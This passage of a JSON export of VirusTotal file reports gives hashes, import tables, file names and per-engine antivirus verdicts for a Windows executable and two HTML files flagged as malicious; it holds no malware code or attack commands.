              "DeleteObject",
              "SetTextColor"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "RegCreateKeyExW",
              "RegCloseKey",
              "RegNotifyChangeKeyValue",
              "RegOpenKeyExW",
              "RegDeleteKeyW",
              "CryptHashData",
              "RegQueryValueExW",
              "CryptCreateHash",
              "DuplicateToken",
              "RegEnumKeyW",
              "SetFileSecurityW",
              "LookupAccountNameW",
              "CryptReleaseContext",
              "SetServiceStatus",
              "RegisterServiceCtrlHandlerW",
              "RegEnumKeyExW",
              "OpenThreadToken",
              "CryptDestroyHash",
              "CryptAcquireContextW",
              "RegDeleteValueW",
              "RegSetValueExW",
              "FreeSid",
              "CryptGetHashParam",
              "RegEnumValueW",
              "AllocateAndInitializeSid",
              "CheckTokenMembership",
              "StartServiceCtrlDispatcherW",
              "SetThreadToken"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "GetStdHandle",
              "GetDriveTypeW",
              "GetConsoleOutputCP",
              "WaitForSingleObject",
              "HeapAlloc",
              "GetFileAttributesW",
              "GetExitCodeProcess",
              "FreeEnvironmentStringsA",
              "DeleteCriticalSection",
              "GetCurrentProcess",
              "GetConsoleMode",
              "GetLocaleInfoA",
              "SetErrorMode",
              "FreeEnvironmentStringsW",
              "lstrcatW",
              "SetStdHandle",
              "GetCPInfo",
              "lstrcmpiA",
              "GetStringTypeA",
              "GetDiskFreeSpaceW",
              "GetTempPathW",
              "GetSystemTimeAsFileTime",
              "HeapReAlloc",
              "GetStringTypeW",
              "FreeLibrary",
              "FindClose",
              "InterlockedDecrement",
              "MoveFileW",
              "SetFileAttributesW",
              "SetLastError",
              "TlsGetValue",
              "CopyFileW",
              "RemoveDirectoryW",
              "IsDebuggerPresent",
              "ExitProcess",
              "GetModuleFileNameA",
              "lstrcmpiW",
              "UnhandledExceptionFilter",
              "LoadLibraryExW",
              "MultiByteToWideChar",
              "GetCalendarInfoA",
              "GetPrivateProfileStringW",
              "SetFilePointer",
              "GetFullPathNameW",
              "CreateThread",
              "GetSystemDirectoryW",
              "SetUnhandledExceptionFilter",
              "MulDiv",
              "TerminateProcess",
              "SearchPathW",
              "WriteConsoleA",
              "SetCurrentDirectoryW",
              "GlobalAlloc",
              "GetVersion",
              "InterlockedIncrement",
              "IsBadHugeReadPtr",
              "WriteConsoleW",
              "InitializeCriticalSectionAndSpinCount",
              "HeapFree",
              "EnterCriticalSection",
              "SetHandleCount",
              "LoadLibraryW",
              "EndUpdateResourceW",
              "GetVersionExW",
              "GetOEMCP",
              "QueryPerformanceCounter",
              "GetTickCount",
              "TlsAlloc",
              "FlushFileBuffers",
              "LoadLibraryA",
              "RtlUnwind",
              "GetStartupInfoA",
              "GetWindowsDirectoryW",
              "GetFileSize",
              "OpenProcess",
              "GetPrivateProfileIntA",
              "CreateDirectoryW",
              "DeleteFileW",
              "GetProcAddress",
              "SetSystemTimeAdjustment",
              "GetTempFileNameW",
              "lstrcpyW",
              "GetModuleFileNameW",
              "ExpandEnvironmentStringsW",
              "FindNextFileW",
              "lstrcpyA",
              "GetComputerNameA",
              "FindFirstFileW",
              "lstrcmpW",
              "GlobalLock",
              "CreateFileW",
              "GetFileType",
              "TlsSetValue",
              "CreateFileA",
              "GetCurrentThreadId",
              "LeaveCriticalSection",
              "GetLastError",
              "LCMapStringW",
              "GetShortPathNameW",
              "lstrlenA",
              "GlobalFree",
              "GetConsoleCP",
              "LCMapStringA",
              "GetEnvironmentStringsW",
              "GlobalUnlock",
              "lstrlenW",
              "VirtualFree",
              "GetEnvironmentStrings",
              "CompareFileTime",
              "GetCurrentProcessId",
              "SetFileTime",
              "GetCommandLineW",
              "WideCharToMultiByte",
              "HeapSize",
              "GetCommandLineA",
              "WritePrivateProfileStringW",
              "lstrcpynW",
              "RaiseException",
              "TlsFree",
              "GetModuleHandleA",
              "ReadFile",
              "CloseHandle",
              "lstrcpynA",
              "GetACP",
              "GetModuleHandleW",
              "IsValidCodePage",
              "HeapCreate",
              "WriteFile",
              "CreateProcessW",
              "Sleep",
              "VirtualAlloc"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "SHGetFileInfoA",
              "ShellExecuteExA",
              "SHBrowseForFolderA",
              "SHBrowseForFolderW",
              "SHChangeNotify",
              "SHFileOperationW",
              "ShellExecuteW",
              "SHGetPathFromIDListW",
              "SHGetSpecialFolderLocation",
              "SHGetFileInfoW",
              "SHGetPathFromIDListA",
              "SHGetMalloc",
              "SHFileOperationA"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CreateStreamOnHGlobal",
              "OleUninitialize",
              "CoTaskMemFree",
              "OleInitialize",
              "CoCreateInstance",
              "CLSIDFromString"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "SetFocus",
              "GetMessagePos",
              "LoadBitmapW",
              "PostQuitMessage",
              "LoadBitmapA",
              "SetWindowPos",
              "IsWindow",
              "DispatchMessageA",
              "EndPaint",
              "GetDC",
              "SendMessageW",
              "SendMessageA",
              "GetClassInfoW",
              "GetDlgItemTextW",
              "LoadImageW",
              "OpenClipboard",
              "GetWindowTextA",
              "DrawTextW",
              "DestroyWindow",
              "GetMessageA",
              "GetParent",
              "UpdateWindow",
              "SetClassLongW",
              "ShowWindow",
              "CharToOemBuffA",
              "PeekMessageW",
              "EnableWindow",
              "CharUpperW",
              "GetDlgItemTextA",
              "PeekMessageA",
              "TranslateMessage",
              "IsWindowEnabled",
              "GetWindow",
              "CharUpperA",
              "RegisterClassW",
              "LoadStringA",
              "SetClipboardData",
              "OemToCharBuffA",
              "EnableMenuItem",
              "GetWindowLongA",
              "CreateWindowExA",
              "OemToCharA",
              "FillRect",
              "CopyRect",
              "WaitForInputIdle",
              "CreateWindowExW",
              "GetWindowLongW",
              "CharNextW",
              "MapWindowPoints",
              "BeginPaint",
              "DefWindowProcW",
              "CharPrevW",
              "DefWindowProcA",
              "SendDlgItemMessageA",
              "GetSystemMetrics",
              "SetWindowLongW",
              "GetWindowRect",
              "PostMessageA",
              "SetWindowLongA",
              "CheckDlgButton",
              "CreateDialogParamW",
              "CreatePopupMenu",
              "SetWindowTextW",
              "SetTimer",
              "GetDlgItem",
              "ScreenToClient",
              "FindWindowExA",
              "LoadCursorA",
              "LoadIconA",
              "TrackPopupMenu",
              "LoadCursorW",
              "GetSystemMenu",
              "FindWindowExW",
              "DispatchMessageW",
              "SetForegroundWindow",
              "ExitWindowsEx",
              "CharToOemA",
              "EmptyClipboard",
              "EndDialog",
              "CharNextA",
              "SetWindowTextA",
              "SetMenu",
              "SetDlgItemTextA",
              "DialogBoxParamW",
              "MessageBoxA",
              "AppendMenuW",
              "wvsprintfA",
              "DialogBoxParamA",
              "MessageBoxIndirectW",
              "GetSysColor",
              "SetDlgItemTextW",
              "RegisterClassExA",
              "DestroyIcon",
              "IsWindowVisible",
              "SystemParametersInfoW",
              "InvalidateRect",
              "wsprintfA",
              "CallWindowProcW",
              "GetClientRect",
              "GetClassNameA",
              "SendMessageTimeoutW",
              "wsprintfW",
              "CloseClipboard",
              "SetCursor"
            ]
          },
          {
            "library_name": "COMCTL32.dll",
            "imported_functions": [
              "ImageList_Create",
              "ImageList_Destroy",
              "ImageList_AddMasked"
            ]
          }
        ],
        "entry_point": 44450
      },
      "magic": "PE32 executable for MS Windows (GUI) Intel 80386 32-bit",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 2,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 60,
        "undetected": 13
      },
      "meaningful_name": "mvyMacd.exe",
      "reputation": 0
    },
    "type": "file",
    "id": "d621bb588911e91904b6c1016006eceff57307472986a4bd443b4f20a9c0b1ba",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/d621bb588911e91904b6c1016006eceff57307472986a4bd443b4f20a9c0b1ba"
    }
  }
},
{
  "_id": {
    "$oid": "65aba87bed57d2350d0299bf"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [
        "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362.bin",
        "a35hx72L.txt",
        "yVgZxvGV.lnk"
      ],
      "last_modification_date": 1704704809,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 33419,
      "type_extension": "html",
      "last_submission_date": 1315190303,
      "last_analysis_results": {
        "nProtect": {
          "category": "undetected",
          "engine_name": "nProtect",
          "engine_version": "2011-09-04.01",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "11.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "5.400.0.1158",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.111.5083",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110902"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.7.0.1.290",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110903"
        },
        "VirusBuster": {
          "category": "undetected",
          "engine_name": "VirusBuster",
          "engine_version": "14.0.200.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110903"
        },
        "NOD32": {
          "category": "undetected",
          "engine_name": "NOD32",
          "engine_version": "6436",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "F-Prot": {
          "category": "undetected",
          "engine_name": "F-Prot",
          "engine_version": "4.6.2.117",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "20111.2.0.82",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Norman": {
          "category": "undetected",
          "engine_name": "Norman",
          "engine_version": "6.07.11",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "ByteHero": {
          "category": "undetected",
          "engine_name": "ByteHero",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110822"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.500.0.1008",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "4.8.1351.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "eSafe": {
          "category": "undetected",
          "engine_name": "eSafe",
          "engine_version": "7.0.17.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.97.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "9.0.0.837",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "SUPERAntiSpyware": {
          "category": "malicious",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "4.40.0.1006",
          "result": "Rogue.Agent/Gen-Nullo[BIN]",
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.69.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Comodo": {
          "category": "undetected",
          "engine_name": "Comodo",
          "engine_version": "9994",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "9.0.16440.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "5.0.2.03300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "10374",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "AntiVir": {
          "category": "undetected",
          "engine_name": "AntiVir",
          "engine_version": "7.11.14.92",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.500.0.1008",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110903"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "2010.1D",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "5.1.0.11",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "eTrust-Vet": {
          "category": "undetected",
          "engine_name": "eTrust-Vet",
          "engine_version": "36.1.8537",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110902"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "13.0.900",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "2.0.3.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.7604",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2011.9.3.4655",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Prevx": {
          "category": "undetected",
          "engine_name": "Prevx",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "22",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Commtouch": {
          "category": "undetected",
          "engine_name": "Commtouch",
          "engine_version": "5.3.2.6",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "2011.09.04.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.16.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110902"
        },
        "PCTools": {
          "category": "undetected",
          "engine_name": "PCTools",
          "engine_version": "8.0.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "23.73.01.03",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110830"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "T3.1.1.107.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "4.3.370.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "10.0.0.1190",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110905"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "10.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        },
        "Avast5": {
          "category": "undetected",
          "engine_name": "Avast5",
          "engine_version": "5.0.677.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110904"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362",
      "tags": [],
      "last_analysis_date": 1315190303,
      "unique_sources": 0,
      "first_submission_date": 1315190303,
      "ssdeep": "384:SaysBQS33QYQgew6tdt6p8zTuH6PlirPz5jk0+ikXeVDTD97nQxFjbJqMnNoIx+t:SaysBpQYQfAIlirPz5Q0+Q8b0kx9Q",
      "md5": "cd1b8893a2b346263f046bb49e4cf26e",
      "sha1": "cd471ec67c29bf5aaaa9674c2935c9be39f920c6",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 1,
        "undetected": 43
      },
      "meaningful_name": "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362.bin",
      "reputation": -7
    },
    "type": "file",
    "id": "e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e2569690f1d65d4c95b640750f6674233f51ef4395b34233b878dd373986c362"
    }
  }
},
{
  "_id": {
    "$oid": "65abaad60d11c2d01c368f87"
  },
  "data": {
    "attributes": {
      "type_description": "unknown",
      "type_tags": [],
      "names": [
        "5a5e00e260f27ada023c5e43decd8658",
        "aa",
        "ZDuXLlB.wbs",
        "qkyvLKOUC.ocx"
      ],
      "last_modification_date": 1705209487,
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 12367,
      "popular_threat_classification": {
        "suggested_threat_label": "crypted",
        "popular_threat_name": [
          {
            "count": 2,
            "value": "crypted"
          }
        ]
      },
      "last_submission_date": 1302894718,
      "last_analysis_results": {
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "11.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "5.400.0.1158",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.96.4398",
          "result": "Trojan",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.7.0.1.175",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "VirusBuster": {
          "category": "undetected",
          "engine_name": "VirusBuster",
          "engine_version": "13.6.307.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "NOD32": {
          "category": "malicious",
          "engine_name": "NOD32",
          "engine_version": "6045",
          "result": "JS/Kryptik.AD",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "F-Prot": {
          "category": "malicious",
          "engine_name": "F-Prot",
          "engine_version": "4.6.2.117",
          "result": "IFrame.gen",
          "method": "blacklist",
          "engine_update": "20110414"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "20101.3.2.89",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Norman": {
          "category": "undetected",
          "engine_name": "Norman",
          "engine_version": "6.07.07",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.200.0.1012",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "4.8.1351.0",
          "result": "JS:IFrame-BI",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "eSafe": {
          "category": "undetected",
          "engine_name": "eSafe",
          "engine_version": "7.0.17.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.97.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "7.0.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2011.4.15.4412",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Comodo": {
          "category": "undetected",
          "engine_name": "Comodo",
          "engine_version": "8354",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "9.0.16440.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "5.0.2.03300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "9022",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "AntiVir": {
          "category": "malicious",
          "engine_name": "AntiVir",
          "engine_version": "7.11.6.143",
          "result": "HTML/Crypted.Gen",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.200.0.1012",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "2010.1D",
          "result": "Heuristic.BehavesLike.JS.CodeUnfolding.C",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.64.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "eTrust-Vet": {
          "category": "undetected",
          "engine_name": "eTrust-Vet",
          "engine_version": "36.1.8274",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "13.0.900",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "2.0.3.7",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.6702",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "4.40.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Prevx": {
          "category": "undetected",
          "engine_name": "Prevx",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "22",
          "result": "JS:IFrame-BI ",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Commtouch": {
          "category": "undetected",
          "engine_name": "Commtouch",
          "engine_version": "5.2.11.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "2011.04.15.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.16.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "PCTools": {
          "category": "undetected",
          "engine_name": "PCTools",
          "engine_version": "7.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "23.53.04.05",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "T3.1.1.103.0",
          "result": "HTML.Crypted",
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "4.2.257.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "10.0.0.1190",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "10.0.3.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20110415"
        },
        "Avast5": {
          "category": "malicious",
          "engine_name": "Avast5",
          "engine_version": "5.0.677.0",
          "result": "JS:IFrame-BI",
          "method": "blacklist",
          "engine_update": "20110415"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "dcd3c8b00518a113f731de4548a66b84c11e52f8b8666e2626d95d90a7ecf241",
      "tags": [],
      "last_analysis_date": 1302894718,
      "unique_sources": 1,
      "first_submission_date": 1302894718,
      "ssdeep": "192:UhVqp+pbpVNoS9pbV3So0lxIL0JiJJ15JxJYJ4uuo3iGWvWVadki:Yu6vK1o0luG8BL",
      "md5": "5a5e00e260f27ada023c5e43decd8658",
      "sha1": "c3dd299b09480a768900996e9c6a6cc4aeff12a4",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 9,
        "undetected": 32
      },
      "meaningful_name": "5a5e00e260f27ada023c5e43decd8658",
      "reputation": -7
    },
    "type": "file",
    "id": "dcd3c8b00518a113f731de4548a66b84c11e52f8b8666e2626d95d90a7ecf241",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/dcd3c8b00518a113f731de4548a66b84c11e52f8b8666e2626d95d90a7ecf241"
    }
  }
}]